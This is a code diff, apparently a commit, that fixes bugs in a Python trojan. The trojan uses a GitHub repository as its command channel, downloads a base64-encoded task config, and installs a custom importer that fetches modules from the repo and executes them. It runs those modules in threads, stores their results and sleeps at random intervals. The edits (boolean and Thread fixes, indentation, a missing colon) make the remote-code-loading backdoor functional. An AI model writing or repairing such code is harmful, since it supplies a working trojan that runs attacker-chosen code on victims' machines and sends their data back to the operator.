@@ -12,8 +12,9 @@ from github3 import login
 
 trojan_id="abc"
 trojan_config="%s.json" % trojan_id
+data_path="data/%s/" % trojan_id
 trojan_modules=[]
-configured=false
+configured=False
 task_queue=Queue.Queue()
 
 def connect_to_github():
@@ -21,9 +22,9 @@ def connect_to_github():
     repo=gh.repository("cmfcmf29","777")
     branch=repo.branch("master")
     return gh,repo,branch
-def get_file_contents(filepath)
+def get_file_contents(filepath):
     gh,repo,branch = connect_to_github()
-    tree=branch.commit.tree.recurse()
+    tree=branch.commit.commit.tree.recurse()
     
     for filename in tree.tree:
         if filepath in filename.path:
@@ -35,7 +36,7 @@ def get_trojan_config():
     global configured
     config_json=get_file_contents(trojan_config)
     config=json.loads(base64.b64decode(config_json))
-    configured=true
+    configured=True
     for task in config:
         if task['module'] not in sys.modules:
             exec("import %s" % task['module'])
@@ -49,7 +50,7 @@ def store_module_result(data):
 
 class GitImporter(object):
     def __init__(self):
-    self.current_module_code = ""
+        self.current_module_code=""
     
     def find_module(self,fullname,path=None):
         if configured:
@@ -74,12 +75,13 @@ def module_runner(module):
     store_module_result(result)
     return
 sys.meta_path=[GitImporter()]
-while true:
+
+while True:
     if task_queue.empty():
         config=get_trojan_config()
         for task in config:
-            t=threading.thread(target=module_runner,args=(task['module'],))
+            t=threading.Thread(target=module_runner,args=(task['module'],))
             t.start()
             time.sleep(random.randint(1,10))
-            time.sleep(random.randint(1000, 10000))
+    time.sleep(random.randint(1000, 10000))
             
